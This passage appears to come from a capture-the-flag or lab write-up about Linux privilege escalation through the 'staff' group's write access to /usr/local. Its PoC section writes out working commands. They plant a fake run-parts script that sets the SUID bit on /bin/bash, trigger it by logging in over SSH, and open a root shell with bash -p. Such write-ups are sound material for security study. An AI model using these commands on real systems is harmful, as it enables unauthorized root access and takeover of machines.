
Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may "override" the executables in /bin and /usr/bin with the same name). Compare with group "adm", which is more related to monitoring/security. 

---
## PoC

With that in mind, we will now create a malicious run-parts file in /usr/local/bin, which we know will be executed as soon as we SSH into the machine.

Using the following one-liner, we create an executable payload that will turn the bash binary into an SUID binary, effectively giving us a root shell.

```
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
```

Giving the binary executable permissions

```
chmod +x /usr/local/bin/run-parts
```

Reconnected to the box so the run-parts binary gets executed (it gets always executed on connection).

```
ssh jkr@10.129.72.194                                   
jkr@10.129.72.194's password: 

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 16 15:47:45 2026 from 10.10.14.57
-bash-4.4$
```

Utilized the following command to gain root shell, since the bash binary now is set to SUID.

```
/bin/bash -p
```